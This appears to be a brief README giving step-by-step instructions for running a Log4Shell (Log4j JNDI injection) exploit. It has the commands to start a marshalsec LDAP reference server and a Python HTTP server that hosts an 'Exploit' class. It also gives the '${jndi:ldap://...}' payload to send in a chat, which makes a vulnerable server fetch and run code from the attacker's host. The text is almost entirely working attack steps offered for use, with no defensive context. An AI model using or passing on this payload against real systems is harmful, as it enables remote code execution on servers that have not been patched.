How to run the exploit
* run the following commands in the terminal `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8888/#Exploit`
* opend a new terminal instance and run `python -m http.server 8888`
* then send this in the chat `${jndi:ldap://ip:1389/#Exploit}`
